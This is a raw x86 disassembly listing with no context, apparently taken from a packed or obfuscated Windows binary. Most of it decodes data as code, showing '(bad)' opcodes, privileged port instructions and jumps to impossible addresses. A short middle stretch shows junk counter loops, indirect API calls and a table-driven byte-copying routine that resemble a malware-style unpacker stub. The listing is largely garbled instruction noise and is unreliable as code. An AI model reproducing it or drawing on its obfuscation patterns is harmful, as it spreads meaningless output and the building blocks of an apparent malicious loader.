  402992:	fcomp  QWORD PTR ds:0xe4e00590
  402998:	push   ds
  402999:	and    al,0x21
  40299b:	lods   eax,DWORD PTR ds:[esi]
  40299c:	xchg   esi,eax
  40299d:	or     esp,edi
  40299f:	jae    0x4029da
  4029a1:	out    dx,eax
  4029a2:	lods   eax,DWORD PTR ds:[esi]
  4029a3:	inc    edi
  4029a4:	mov    ebp,0xb57cf70d
  4029a9:	pop    edx
  4029aa:	push   ebp
  4029ab:	gs push ebp
  4029ad:	jmp    0x7de8594a
  4029b2:	sbb    al,0x91
  4029b4:	sbb    eax,0x38ef8841
  4029b9:	test   al,0x40
  4029bb:	and    ah,BYTE PTR [edx+eiz*2-0x38b3e9a8]
  4029c2:	xlat   BYTE PTR ds:[ebx]
  4029c3:	stc    
  4029c4:	inc    edi
  4029c5:	out    0x16,al
  4029c7:	mov    ebp,0xe5f9dafc
  4029cc:	push   ecx
  4029cd:	mov    al,ds:0x2ffb3e91
  4029d2:	and    al,BYTE PTR [edx-0x16]
  4029d5:	hlt    
  4029d6:	pop    esp
  4029d7:	xchg   ecx,eax
  4029d8:	xlat   BYTE PTR ds:[ebx]
  4029d9:	pop    ds
  4029da:	sub    esp,ebp
  4029dc:	inc    ecx
  4029dd:	cmp    eax,0xdf4f1816
  4029e2:	rcl    BYTE PTR [eax],cl
  4029e4:	fbstp  TBYTE PTR [ebp+eiz*1-0x2f]
  4029e8:	shl    esp,1
  4029ea:	or     eax,0xd1136e62
  4029ef:	dec    edx
  4029f0:	lods   al,BYTE PTR ds:[esi]
  4029f1:	push   0xa618d98
  4029f6:	dec    eax
  4029f7:	mov    BYTE PTR [ecx-0x59],al
  4029fa:	mov    ebp,eax
  4029fc:	(bad)  
  4029fd:	sahf   
  4029fe:	mov    edi,0xb8335e86
  402a03:	cmp    dl,BYTE PTR [edi]
  402a05:	xchg   ebx,eax
  402a06:	test   BYTE PTR [ebx-0xc],cl
  402a09:	pop    ebp
  402a0a:	popa   
  402a0b:	out    dx,al
  402a0c:	mov    ch,0x3
  402a0e:	add    edi,DWORD PTR [ebp+0x10]
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0x2238ba80,al
  402a42:	int    0x68
  402a44:	or     al,0x7e
  402a46:	jle    0x402a9d
  402a48:	jg     0x402ac8
  402a4a:	jle    0x4029d6
  402a4c:	pop    ecx
  402a4d:	dec    ebp
  402a4e:	ss xchg edi,eax
  402a50:	push   ss
  402a51:	inc    esp
  402a52:	lds    ebx,FWORD PTR [ebx-0x2c]
  402a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a56:	xor    DWORD PTR [edx+0x4c14e37a],ecx
  402a5c:	xor    al,0x5d
  402a5e:	in     al,0xd7
  402a60:	in     al,0x97
  402a62:	jo     0x402a0a
  402a64:	shl    BYTE PTR [ebx+0x526a0285],0x7f
  402a6b:	pop    es
  402a6c:	in     eax,dx
  402a6d:	and    eax,0xef1184e9
  402a72:	jnp    0x402a44
  402a74:	loope  0x402a2d
  402a76:	sub    al,0x8a
  402a78:	cmp    DWORD PTR [ebp-0x41a76e50],esp
  402a7e:	into   
  402a7f:	ret    0xee34
  402a82:	fwait
  402a83:	pop    eax
  402a84:	and    BYTE PTR [esi+0xc],0x17
  402a88:	xor    edi,esi
  402a8a:	icebp  
  402a8b:	in     eax,dx
  402a8c:	imul   edi,edi,0x6a
  402a8f:	cmp    al,0xf
  402a91:	(bad)  
  402a92:	jmp    0x4c2b:0x5c9063da
  402a99:	cmp    esi,DWORD PTR [edx-0x4dcf7194]
  402a9f:	dec    ebx
  402aa0:	push   ebx
  402aa1:	push   ebx
  402aa2:	dec    ecx
  402aa3:	ror    BYTE PTR [esp+ebx*8],cl
  402aa6:	adc    bl,BYTE PTR [edi]
  402aa8:	mov    ecx,ebx
  402aaa:	adc    BYTE PTR [ebx],dh
  402aac:	cmp    eax,0xb4262e72
  402ab1:	imul   esi,DWORD PTR [esi],0x2e1f1971
  402ab7:	mov    al,ds:0x79b2e466
  402abc:	sar    BYTE PTR [ebx+0x69],1
  402abf:	or     ebp,DWORD PTR [ecx]
  402ac1:	or     DWORD PTR [edx+0x4a],ecx
  402ac4:	mov    ds:0xa83c8764,al
  402ac9:	adc    al,0xeb
  402acb:	stos   BYTE PTR es:[edi],al
  402acc:	xor    dl,BYTE PTR [edi-0x48e2fc90]
  402ad2:	fnstenv [eax-0x72]
  402ad5:	dec    ecx
  402ad6:	xchg   BYTE PTR [ebp+eiz*2+0x7c],ch
  402ada:	sbb    eax,0x375a5b89
  402adf:	data16 out dx,al
  402ae1:	jmp    0x402aef
  402ae3:	fld    TBYTE PTR ds:0x9c9393b
  402ae9:	inc    esp
  402aea:	jmp    0xde98:0x8433f109
  402af1:	mov    ah,0x28
  402af3:	dec    ecx
  402af4:	sbb    DWORD PTR [eax],0x3937220b
  402afa:	cmp    ebx,edx
  402afc:	push   ecx
  402afd:	push   ss
  402afe:	test   DWORD PTR gs:[ecx-0x72],esi
  402b02:	ja     0x402aa4
  402b04:	sub    eax,0x162271ae
  402b09:	mov    ah,0x1e
  402b0b:	sub    BYTE PTR [esi+0x5920cf8f],ah
  402b11:	jle    0x402afd
  402b13:	ds mov esi,0x6445ce06
  402b19:	xor    ecx,ebp
  402b1b:	imul   edi,ecx,0xd96601f5
  402b21:	push   edx
  402b22:	and    BYTE PTR [esi+0x68299beb],al
  402b28:	call   0x60fc62f
  402b2d:	in     al,0xd0
  402b2f:	outs   dx,BYTE PTR ds:[esi]
  402b30:	and    BYTE PTR ds:0xc90882c4,al
  402b36:	ret    0x77a9
  402b39:	iret   
  402b3a:	dec    eax
  402b3b:	push   ds
  402b3c:	cmc    
  402b3d:	xor    al,0x75
  402b3f:	bound  edx,QWORD PTR [edx-0x5f]
  402b42:	js     0x402b4a
  402b44:	dec    ebp
  402b45:	cld    
  402b46:	clc    
  402b47:	bound  ecx,QWORD PTR [edi-0x36a3d4c2]
  402b4d:	scas   eax,DWORD PTR es:[edi]
  402b4e:	mov    ds:0xbb388880,eax
  402b53:	aam    0xcb
  402b55:	xor    DWORD PTR ds:[ecx-0x7a581010],0x1a
  402b5d:	popf   
  402b5e:	cmp    BYTE PTR [ecx+0x4fece414],bh
  402b64:	push   eax
  402b65:	inc    eax
  402b66:	pop    es
  402b67:	sub    al,0x41
  402b69:	loopne 0x402b0e
  402b6b:	lahf   
  402b6c:	loopne 0x402afc
  402b6e:	dec    esi
  402b6f:	jp     0x402b36
  402b71:	arpl   WORD PTR [ebp+eax*4-0x6d58bc23],bp
  402b78:	cmp    eax,0x88df9300
  402b7d:	cmp    al,0xcd
  402b7f:	inc    eax
  402b80:	popf   
  402b81:	adc    eax,0x6c6db4f8
  402b86:	aam    0xc1
  402b88:	cmp    eax,0x27152a8e
  402b8d:	mov    cl,0xfc
  402b8f:	pop    ebx
  402b90:	pusha  
  402b91:	mov    ebx,0xf481aaeb
  402b96:	jno    0x402be2
  402b98:	cmp    eax,0x7744ef8a
  402b9d:	out    0xbd,al
  402b9f:	test   al,0xdb
  402ba1:	call   0xbfa3:0xd8796598
  402ba8:	in     eax,0x2b
  402baa:	es jne 0x402be1
  402bad:	xchg   BYTE PTR [ecx],bl
  402baf:	and    al,0xd9
  402bb1:	call   FWORD PTR [edi+eax*4]
  402bb4:	sbb    eax,0x7270edf0
  402bb9:	mov    ebx,0x25805301
  402bbe:	and    al,0x77
  402bc0:	dec    esi
  402bc1:	cmp    DWORD PTR [ebx],edi
  402bc3:	imul   esp,DWORD PTR [edi-0x57],0xd9b492f8
  402bca:	and    eax,0xcd9706de
  402bcf:	mov    ebp,0x6d92e4a0
  402bd4:	sub    edx,eax
  402bd6:	mov    ds:0x41798cbd,eax
  402bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bdc:	bound  bp,DWORD PTR [ebx+0x33d8205b]
  402be3:	int3   
  402be4:	gs inc eax
  402be6:	and    ebx,DWORD PTR [edx-0x25]
  402be9:	ins    DWORD PTR es:[edi],dx
  402bea:	mov    al,0x6d
  402bec:	lahf   
  402bed:	add    al,BYTE PTR [edi]
  402bef:	jb     0x402c31
  402bf1:	jge    0x402c6f
  402bf3:	jne    0x402c56
  402bf5:	pushf  
  402bf6:	mov    ebp,0x2c351947
  402bfb:	mov    dh,0xff
  402bfd:	dec    edi
  402bfe:	cmp    esi,ecx
  402c00:	int3   
  402c01:	jge    0x402bc9
  402c03:	out    0xfd,al
  402c05:	add    BYTE PTR [eax+0x21d28458],bh
  402c0b:	and    esp,DWORD PTR [edx+0x506165b8]
  402c11:	push   ss
  402c12:	ret    
  402c13:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c15:	inc    eax
  402c16:	leave  
  402c17:	mov    bh,0xc3
  402c19:	arpl   WORD PTR [edx],si
  402c1b:	enter  0x57f5,0x48
  402c1f:	popa   
  402c20:	inc    edx
  402c21:	and    BYTE PTR [edi+0x333419c8],bl
  402c27:	stc    
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x25
  402c6b:	pusha  
  402c6c:	pop    eax
  402c6d:	lods   al,BYTE PTR ds:[esi]
  402c6e:	dec    edi
  402c6f:	or     bh,BYTE PTR [esi+0x7e]
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402ca1
  402c77:	cmp    DWORD PTR [esi],ebx
  402c79:	xlat   BYTE PTR ds:[ebx]
  402c7a:	jno    0x402c8b
  402c7c:	bound  ecx,QWORD PTR ds:0x396bc2a8
  402c82:	in     eax,0x88
  402c84:	dec    esi
  402c85:	inc    esi
  402c86:	out    0x90,eax
  402c88:	pop    sp
  402c8a:	and    bl,BYTE PTR [ecx]
  402c8c:	inc    ebx
  402c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c8e:	je     0x402cc4
  402c90:	clc    
  402c91:	sub    bl,dl
  402c93:	and    BYTE PTR [ebx+0x23],bh
  402c96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c97:	icebp  
  402c98:	mov    esp,cr5
  402c9b:	mov    esp,0xb7a85da3
  402ca0:	jnp    0x402d07
  402ca2:	aam    0xd4
  402ca4:	xchg   edi,eax
  402ca5:	mov    DWORD PTR [ecx+esi*1],ebx
  402ca8:	inc    esp
  402ca9:	xchg   ebx,eax
  402caa:	xchg   BYTE PTR [ecx-0x41],ch
  402cad:	int    0x20
  402caf:	add    DWORD PTR [ecx],ebx
  402cb1:	cwde   
  402cb2:	add    eax,0x3633bbb0
  402cb7:	shr    DWORD PTR [edi+0x14],cl
  402cba:	push   es
  402cbb:	cmp    BYTE PTR [eax],0xb
  402cbe:	mov    dh,0x27
  402cc0:	pop    ss
  402cc1:	jns    0x402c9b
  402cc3:	push   ebx
  402cc4:	outs   dx,BYTE PTR ds:[esi]
  402cc5:	(bad)  
  402cc6:	fild   WORD PTR [edx-0x73]
  402cc9:	ret    
  402cca:	jne    0x402cb6
  402ccc:	pop    ds
  402ccd:	xchg   edx,eax
  402cce:	cli    
  402ccf:	imul   edi,DWORD PTR gs:[esi+0x40c5f31d],0x78
  402cd7:	mov    bh,BYTE PTR [ecx]
  402cd9:	jl     0x402c7c
  402cdb:	xor    al,BYTE PTR [edx+0x46]
  402cde:	jge    0x402c64
  402ce0:	fsubr  QWORD PTR [edi]
  402ce2:	jmp    0xe5f55cee
  402ce7:	in     al,0x83
  402ce9:	or     al,0xfb
  402ceb:	or     eax,0xc385dd7
  402cf1:	je     0x402ce0
  402cf3:	cmp    eax,0xfa426d5d
  402cf8:	pop    edx
  402cf9:	xor    ebx,ebp
  402cfb:	repz push esp
  402cfd:	dec    edi
  402cfe:	mov    edi,0x27d0948f
  402d03:	sti    
  402d04:	push   ds
  402d05:	dec    esi
  402d06:	adc    DWORD PTR [ebx],ebx
  402d08:	test   DWORD PTR [edx-0x26],ecx
  402d0b:	aaa    
  402d0c:	out    0x31,al
  402d0e:	mov    dh,0x14
  402d10:	fst    QWORD PTR [ebx+0x79c4e88a]
  402d16:	cwde   
  402d17:	adc    eax,0x956d9f5d
  402d1c:	cmp    DWORD PTR [ebx],esi
  402d1e:	and    eax,0x726b13e7
  402d23:	jbe    0x402d9d
  402d25:	sub    BYTE PTR [eax],dh
  402d27:	ret    0x7a02
  402d2a:	xchg   ebp,eax
  402d2b:	sbb    BYTE PTR [ecx+0x73],cl
  402d2e:	or     ch,BYTE PTR [ebx+ebp*1]
  402d31:	add    esp,DWORD PTR [esp+esi*1+0x5e]
  402d35:	sbb    eax,0x322562b9
  402d3a:	jo     0x402db4
  402d3c:	in     al,0x85
  402d3e:	test   al,0x4b
  402d40:	shr    BYTE PTR es:[ebx],1
  402d43:	jg     0x402ced
  402d45:	pushf  
  402d46:	dec    eax
  402d47:	sti    
  402d48:	clc    
  402d49:	pop    edi
  402d4a:	mov    WORD PTR [edx+0x71],gs
  402d4d:	sub    eax,0x10
  402d50:	mov    cl,0x71
  402d52:	adc    ah,bh
  402d54:	fisubr DWORD PTR [esi]
  402d56:	mov    ebp,0x5b7b2c04
  402d5b:	fwait
  402d5c:	xchg   ebp,eax
  402d5d:	dec    eax
  402d5e:	fistp  WORD PTR [eax+0x57]
  402d61:	in     al,0x24
  402d63:	push   edx
  402d64:	int    0x18
  402d66:	int3   
  402d67:	xchg   BYTE PTR [ecx-0x6a],ah
  402d6a:	scas   eax,DWORD PTR es:[edi]
  402d6b:	mov    ch,0xe1
  402d6d:	les    ebp,FWORD PTR [ecx+ebx*8-0x5d]
  402d71:	aam    0x35
  402d73:	pop    ds
  402d74:	js     0x402ddd
  402d76:	(bad)  
  402d77:	stos   DWORD PTR es:[edi],eax
  402d78:	mov    edi,esi
  402d7a:	nop
  402d7b:	push   ebx
  402d7c:	add    eax,0xac4f9cfd
  402d81:	dec    ebx
  402d82:	pop    edi
  402d83:	popf   
  402d84:	(bad)  
  402d85:	dec    eax
  402d86:	xor    cl,BYTE PTR [edx]
  402d88:	mov    BYTE PTR [esi+0x11],al
  402d8b:	mov    DWORD PTR [eax+0x7],ebp
  402d8e:	mov    esi,0xb1d4b8d3
  402d93:	(bad)  
  402d94:	repz mov ebp,DWORD PTR [edx]
  402d97:	mov    DWORD PTR [edi+0x32],ebx
  402d9a:	ds inc esp
  402d9c:	je     0x402d78
  402d9e:	repz inc ebx
  402da0:	cmp    ecx,ebx
  402da2:	loopne 0x402da7
  402da4:	dec    edx
  402da5:	bswap  ebx
  402da7:	jae    0x402d84
  402da9:	mov    ebx,ebx
  402dab:	or     DWORD PTR [edi-0x12],edi
  402dae:	add    dh,BYTE PTR [eax]
  402db0:	fnclex 
  402db2:	rcl    BYTE PTR [edi-0x7a523785],cl
  402db8:	adc    eax,0x3ce69dc
  402dbd:	sub    al,0xf7
  402dbf:	mov    ch,0x47
  402dc1:	loope  0x402d96
  402dc3:	test   al,0x89
  402dc5:	jecxz  0x402e32
  402dc7:	sar    BYTE PTR [edx-0x1c5130cb],cl
  402dcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dce:	jno    0x402e3a
  402dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dd1:	scas   al,BYTE PTR es:[edi]
  402dd2:	adc    esp,edx
  402dd4:	scas   eax,DWORD PTR es:[edi]
  402dd5:	aas    
  402dd6:	sub    bh,BYTE PTR [ecx+0x70126c9e]
  402ddc:	add    bl,BYTE PTR [eax+0x47ef9dd9]
  402de2:	bound  ebx,QWORD PTR [edi+0x48]
  402de5:	jae    0x402d7c
  402de7:	cmp    bl,dh
  402de9:	retf   0xa04
  402dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ded:	mov    ds:0xafa33a67,eax
  402df2:	jp     0x402e14
  402df4:	test   eax,0xb463fd99
  402df9:	mov    ebx,0x810f5173
  402dfe:	xor    DWORD PTR [ebp-0x56],ebx
  402e01:	or     DWORD PTR [ebx+ecx*4+0x33a32a99],0x1c
  402e09:	es inc ebp
  402e0b:	add    al,0xcd
  402e0d:	int    0x3e
  402e0f:	mov    ds:0x1be67c1d,eax
  402e14:	fild   DWORD PTR [ebp-0x48]
  402e17:	loope  0x402dd4
  402e19:	lods   al,BYTE PTR ds:[esi]
  402e1a:	dec    ebx
  402e1b:	xchg   ecx,eax
  402e1c:	and    eax,0x77b475e4
  402e21:	mov    WORD PTR [esi-0x6f048adc],fs
  402e27:	stos   BYTE PTR es:[edi],al
  402e28:	int3   
  402e29:	or     DWORD PTR [edi],ebx
  402e2b:	push   edi
  402e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e2d:	aad    0x2
  402e2f:	std    
  402e30:	not    BYTE PTR [edi+0x32]
  402e33:	and    esp,DWORD PTR [ebx]
  402e35:	(bad)  
  402e36:	std    
  402e37:	push   ebp
  402e38:	lds    edi,FWORD PTR [ecx-0x687badbc]
  402e3e:	jp     0x402e0d
  402e40:	(bad)  
  402e41:	mov    cl,0x46
  402e43:	adc    al,0x71
  402e45:	jge    0x402e75
  402e47:	js     0x402dea
  402e49:	mov    ebp,0xe7afa960
  402e4e:	and    eax,0x75030b36
  402e53:	adc    BYTE PTR [ebx],bh
  402e55:	(bad)  
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e6d0,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x430335
  402e91:	xor    ecx,DWORD PTR ds:0x42ecd3
  402e97:	mov    DWORD PTR ds:0x430335,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42ecef,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42ecef
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42ecef,ecx
  402ec9:	cmp    DWORD PTR ds:0x42ecef,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42ecef,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42e99b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ece7,0x17
  402efd:	cmp    DWORD PTR ds:0x42ece7,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ece7,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x430349
  402f21:	push   0x42e7b7
  402f26:	call   DWORD PTR ds:0x42e8b3
  402f2c:	cmp    DWORD PTR ds:0x42ece7,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ece7
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ece7,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ece7
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ece7,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42eccf,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42eccf
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42eccf,ecx
  402f71:	cmp    DWORD PTR ds:0x42eccf,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x43036d
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e8c7
  402f8f:	cmp    DWORD PTR ds:0x42eccf,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42eccb,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x430355,0x10
  402faf:	cmp    DWORD PTR ds:0x430355,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x430355,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e72d
  402fd4:	call   DWORD PTR ds:0x42e8cb
  402fda:	cmp    DWORD PTR ds:0x430355,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x430355
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x430355,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x430355
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x430355,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x43036d,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e6c0
  403019:	add    DWORD PTR ds:0x42ecf3,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x4303db,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e6c8,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	inc    ecx
  403050:	lods   eax,DWORD PTR ds:[esi]
  403051:	fdivrp st(1),st
  403053:	mov    ds:0xae7e7e08,al
  403058:	jg     0x4030d8
  40305a:	jle    0x402ff3
  40305c:	sub    esp,DWORD PTR [ecx-0x41]
  40305f:	dec    esp
  403060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403061:	(bad)  
  403062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403063:	mov    cl,0xef
  403065:	or     DWORD PTR [esp+eax*2],edx
  403068:	je     0x4030c7
  40306a:	adc    eax,ebx
  40306c:	add    esi,edx
  40306e:	inc    edx
  40306f:	ror    ebx,cl
  403071:	push   cs
  403072:	js     0x4030d0
  403074:	out    dx,eax
  403075:	jno    0x402ff7
  403077:	xor    BYTE PTR [ebx],al
  403079:	lea    esp,[ebx+0x3]
  40307c:	mov    bh,0xea
  40307e:	push   ss
  40307f:	shl    edi,1
  403081:	lea    ecx,[ebx]
  403083:	push   edx
  403084:	call   0x2d67:0x1ec22675
  40308b:	shl    BYTE PTR [esi],0x56
  40308e:	mov    dh,BYTE PTR ds:0x9a858cbd
  403094:	hlt    
  403095:	lock outs dx,BYTE PTR ds:[esi]
  403097:	xchg   ebx,eax
  403098:	or     bl,BYTE PTR [ebx+0x4139b9a9]
  40309e:	pop    edi
  40309f:	mov    ds:0xed0db29e,eax
  4030a4:	out    0xd6,eax
  4030a6:	xor    ch,BYTE PTR [eax-0x3a085d7c]
  4030ac:	ja     0x403126
  4030ae:	jl     0x4030fa
  4030b0:	fisub  WORD PTR ds:0x1a479c70
  4030b6:	pusha  
  4030b7:	dec    ebp
  4030b9:	loopne 0x4030e3
  4030bb:	popa   
  4030bc:	(bad)  
  4030bd:	fsub   DWORD PTR [ebp+0x231bd9f3]
  4030c3:	pusha  
  4030c4:	(bad)  
  4030c5:	dec    esi
  4030c6:	xor    ecx,ebp
  4030c8:	imul   ebp,DWORD PTR [esi-0x7941a97a],0xebab6574
  4030d2:	sbb    eax,0xc45fad95
  4030d7:	lahf   
  4030d8:	ins    BYTE PTR es:[edi],dx
  4030d9:	rcl    DWORD PTR [esi-0x3a23b409],1
  4030df:	lock adc dl,BYTE PTR [ebx+eax*1+0x69]
  4030e4:	and    eax,0x1f180c03
  4030e9:	scas   al,BYTE PTR es:[edi]
  4030ea:	(bad)  
  4030eb:	fadd   st(2),st
  4030ed:	push   edi
  4030ee:	add    al,BYTE PTR [edi+0x6b]
  4030f1:	push   esi
  4030f2:	dec    ecx
  4030f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030f4:	push   ebp
  4030f5:	inc    esp
  4030f6:	in     eax,0xd5
  4030f8:	pop    edi
  4030f9:	inc    esi
  4030fa:	cdq    
  4030fb:	mov    eax,0xa671482a
  403100:	sub    DWORD PTR [esi+0x4b149a64],esp
  403106:	(bad)  
  403107:	ror    dl,0x3b
  40310a:	loop   0x40314d
  40310c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40310e:	xchg   ebp,eax
  40310f:	jnp    0x4030c8
  403111:	fwait
  403112:	scas   eax,DWORD PTR es:[edi]
  403113:	push   esi
  403114:	aad    0xb4
  403116:	dec    ebx
  403117:	sbb    DWORD PTR [esi+0xdb90ecb],edi
  40311d:	add    al,0x7d
  40311f:	lock pusha 
  403121:	ret    0x6e62
  403124:	cld    
  403125:	pop    ds
  403126:	or     eax,0x80485553
  40312b:	cmp    eax,0xfc7466df
  403130:	mov    dh,BYTE PTR [edx-0x50]
  403133:	sub    dl,bh
  403135:	cmc    
  403136:	rcl    BYTE PTR [eax-0x21],cl
  403139:	fdiv   DWORD PTR [edi+0x11]
  40313c:	xor    al,0x49
  40313e:	push   es
  40313f:	into   
  403140:	sar    BYTE PTR [eax],cl
  403142:	xor    al,0xad
  403144:	into   
  403145:	nop
  403146:	in     eax,dx
  403147:	leave  
  403148:	jnp    0x40318f
  40314a:	repnz imul eax,DWORD PTR [edx],0x15
  40314e:	and    al,0x56
  403150:	stos   BYTE PTR es:[edi],al
  403151:	cmp    eax,0x17ab8f8b
  403156:	cld    
  403157:	ins    DWORD PTR es:[edi],dx
  403158:	cmp    al,0x8d
  40315a:	jbe    0x40313d
  40315c:	jg     0x40314a
  40315e:	push   edx
  40315f:	jle    0x40314a
  403161:	jmp    0x5b72f473
  403166:	shl    dl,cl
  403168:	int3   
  403169:	cmc    
  40316a:	leave  
  40316b:	mov    cl,0x7c
  40316d:	xchg   DWORD PTR [ebx+0x71],eax
  403170:	clc    
  403171:	or     eax,0xab9e6f99
  403176:	push   ebp
  403177:	into   
  403178:	enter  0x82d6,0x64
  40317c:	das    
  40317d:	push   0xd37ff4f
  403182:	sbb    ch,BYTE PTR [eax]
  403184:	sbb    BYTE PTR [ecx+0x5db70c2],bh
  40318a:	loop   0x4031a0
  40318c:	sbb    ebp,DWORD PTR [esi]
  40318e:	pop    edi
  40318f:	test   eax,0x10ee826
  403194:	stos   DWORD PTR es:[di],eax
  403196:	dec    ecx
  403197:	inc    edx
  403198:	(bad)  
  403199:	sub    eax,0x131c881d
  40319e:	cmp    eax,0xb90056f7
  4031a3:	dec    esp
  4031a4:	or     eax,0x583bc39d
  4031a9:	repnz mov es:0x8dcc0f90,eax
  4031b0:	pop    edx
  4031b1:	cdq    
  4031b2:	pop    edx
  4031b3:	sbb    al,0x87
  4031b5:	xor    cl,BYTE PTR [esi]
  4031b7:	sar    BYTE PTR ds:0x8e0a485f,1
  4031bd:	jmp    0xc3871021
  4031c2:	and    BYTE PTR [ebx+0x40dc4799],bl
  4031c8:	jbe    0x4031c9
  4031ca:	push   0xcf8289e1
  4031cf:	int    0x2f
  4031d1:	add    cl,dh
  4031d3:	and    esi,edi
  4031d5:	xchg   ebx,eax
  4031d6:	xor    eax,0x39a09bea
  4031db:	sub    eax,0x9ae4b679
  4031e0:	inc    edi
  4031e1:	mov    bl,0x7b
  4031e3:	call   0xdef2c117
  4031e8:	mov    dl,0x35
  4031ea:	mov    edx,esp
  4031ec:	pop    edi
  4031ed:	xor    al,0xcc
  4031ef:	or     edx,DWORD PTR [ebp-0x46c5d72b]
  4031f5:	and    eax,0x1645986d
  4031fa:	xor    DWORD PTR [esi],ebx
  4031fc:	out    0x29,eax
  4031fe:	mov    ch,0xc
  403200:	gs daa 
  403202:	push   ecx
  403203:	jg     0x40323e
  403205:	sbb    al,0xb1
  403207:	jb     0x40326c
  403209:	iret   
  40320a:	inc    edi
  40320c:	inc    ebp
  40320d:	clc    
